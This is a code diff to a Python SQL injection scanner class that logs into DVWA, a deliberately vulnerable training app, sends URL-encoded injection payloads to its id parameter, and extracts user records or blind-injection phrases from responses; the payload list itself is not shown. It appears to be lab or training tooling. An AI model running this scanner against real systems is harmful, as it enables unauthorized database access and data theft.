@@ -2,7 +2,7 @@ import requests
 import os
 import json
 from bs4 import BeautifulSoup
-from urllib.parse import quote  # <-- this is new
+from urllib.parse import quote
 
 class SQLInjectionManager:
     def __init__(self):
@@ -32,8 +32,8 @@ class SQLInjectionManager:
         ]
 
         results = []
-        for payload in payloads:
-            encoded_payload = quote(payload)  # <-- this is the key fix
+        for idx, payload in enumerate(payloads, start=1):
+            encoded_payload = quote(payload)
             full_url = f"{target_url}/?id={encoded_payload}&Submit=Submit"
 
             try:
@@ -43,31 +43,34 @@ class SQLInjectionManager:
                 useful_data = self._extract_useful_data(visible_text)
                 is_vulnerable = bool(useful_data)
 
-                results.append({
+                result = {
+                    "id": idx,
+                    "target": target_url,
+                    "port": port,
+                    "timeout": timeout,
+                    "headers": headers,
                     "payload": payload,
                     "status_code": response.status_code,
                     "snippet": useful_data[:300] if useful_data else "No useful data",
                     "vulnerable": is_vulnerable
-                })
+                }
+                results.append(result)
 
                 print(f"[SQLInjection] Payload '{payload}' gave status {response.status_code}")
 
             except Exception as e:
                 print(f"[SQLInjection] Error on payload '{payload}': {e}")
-                results.append({
+                result = {
+                    "id": idx,
+                    "target": target_url,
+                    "port": port,
+                    "timeout": timeout,
+                    "headers": headers,
                     "payload": payload,
                     "error": str(e),
                     "vulnerable": False
-                })
-
-        output = {
-            "target": target_url,
-            "port": port,
-            "timeout": timeout,
-            "headers": headers,
-            "results": results,
-            "vulnerable": any(r.get("vulnerable") for r in results)
-        }
+                }
+                results.append(result)
 
         os.makedirs(self.output_dir, exist_ok=True)
         try:
@@ -78,7 +81,7 @@ class SQLInjectionManager:
         except:
             existing_data = []
 
-        existing_data.append(output)
+        existing_data.extend(results)
 
         try:
             with open(self.output_file, "w") as f:
@@ -87,7 +90,7 @@ class SQLInjectionManager:
         except Exception as e:
             print(f"[SQLInjection] Failed to save results: {e}")
 
-        return output
+        return results
 
     def _login_to_dvwa(self, session):
         try:
@@ -111,13 +114,11 @@ class SQLInjectionManager:
             return False
 
     def _extract_useful_data(self, text):
-        # Boolean-based blind detection: capture presence/absence phrases
         if "exists in the database" in text:
             return "User ID exists in the database."
         elif "is MISSING from the database" in text:
             return "User ID is MISSING from the database."
         
-        # Fallback for classic SQLi
         lines = text.splitlines()
         useful = [line.strip() for line in lines if "ID:" in line or "First name:" in line or "Surname:" in line]
         return "\n".join(useful) if useful else ""
